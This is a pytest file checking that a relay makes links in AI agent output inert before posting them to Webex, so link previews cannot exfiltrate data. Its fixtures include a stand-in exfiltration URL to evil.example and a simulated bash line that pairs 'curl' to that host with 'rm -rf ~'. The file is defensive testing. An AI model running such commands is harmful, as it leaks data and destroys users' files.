"""Links in agent output are made inert before they reach Webex, so no link preview can carry data out."""

from __future__ import annotations

import pytest

from agent_relay.frontends.webex.links import neutralise_links
from agent_relay.models.events import Harness, SessionStarted, ToolStarted, TurnCompleted
from agent_relay.models.sessions import SessionRecord
from tests.frontends.conftest import Relay

H = Harness.OPENCODE


@pytest.mark.parametrize(
    ("text", "expected"),
    [
        ("see https://evil.example/?d=secret now", "see `https://evil.example/?d=secret` now"),
        ("(https://a.example/x).", "(`https://a.example/x`)."),
        ("go to https://a.example, then", "go to `https://a.example`, then"),
        ("[docs](https://a.example/d)", "docs (`https://a.example/d`)"),
        ('[docs](https://a.example/d "title")', "docs (`https://a.example/d`)"),
        ("![x](https://a.example/p.png?q=1)", "x (`https://a.example/p.png?q=1`)"),
        ("[](https://a.example)", "`https://a.example`"),
        ("<https://a.example/z>", "`https://a.example/z`"),
        ("HTTP://A.EXAMPLE/x", "`HTTP://A.EXAMPLE/x`"),
        (
            "[two](http://a.example) and [three](https://b.example)",
            "two (`http://a.example`) and three (`https://b.example`)",
        ),
        ("no links here, just `code` and a/b", "no links here, just `code` and a/b"),
        ("[not a link](#anchor) and ftp://old", "[not a link](#anchor) and ftp://old"),
    ],
)
def test_links_become_code_spans(text: str, expected: str) -> None:
    assert neutralise_links(text) == expected


def test_code_spans_and_fenced_blocks_are_left_alone() -> None:
    text = "run `curl https://a.example/x` then\n```sh\ncurl https://b.example\n```\nsee https://c.example"
    assert neutralise_links(text) == (
        "run `curl https://a.example/x` then\n```sh\ncurl https://b.example\n```\nsee `https://c.example`"
    )


def test_an_unterminated_fence_protects_the_rest() -> None:
    assert neutralise_links("a https://x.example\n```\nhttps://y.example") == (
        "a `https://x.example`\n```\nhttps://y.example"
    )


def test_neutralising_twice_changes_nothing() -> None:
    once = neutralise_links("[a](https://a.example) https://b.example")
    assert neutralise_links(once) == once


async def _thread(relay: Relay) -> str:
    session = await relay.registry.create_session(
        SessionRecord(session_key="opencode:s1", harness=H, harness_id="s1", workspace="/w/proj")
    )
    await relay.frontend.renderer.handle(SessionStarted(harness=H, session_key=session.session_key))
    return session.session_key


async def test_agent_text_posted_to_webex_has_no_live_links(relay: Relay) -> None:
    key = await _thread(relay)
    await relay.frontend.renderer.handle(
        TurnCompleted(
            harness=H, session_key=key, text="Open [the page](https://x.example/a?k=v) or https://y.example."
        )
    )
    assert relay.bot_texts()[-1] == "Open the page (`https://x.example/a?k=v`) or `https://y.example`."


async def test_relays_own_messages_are_not_rewritten(relay: Relay) -> None:
    await relay.frontend.renderer.post_top("Docs: https://relay.example/help")
    assert relay.bot_texts()[-1] == "Docs: https://relay.example/help"


async def test_tool_lines_and_long_tool_details_are_neutralised_and_cut(relay: Relay) -> None:
    key = await _thread(relay)
    detail = "curl https://evil.example/?d=1 " + "z" * 2000 + " ; rm -rf ~"
    await relay.frontend.renderer.handle(
        ToolStarted(harness=H, session_key=key, tool_id="t1", name="bash", detail=detail)
    )
    await relay.frontend.renderer.handle(TurnCompleted(harness=H, session_key=key, text="done"))
    line = next(t for t in relay.bot_texts() if t.startswith("🔧 bash"))
    assert "`https://evil.example/?d=1`" in line and line.endswith("; rm -rf ~")
    assert "more chars" in line and len(line) < 400
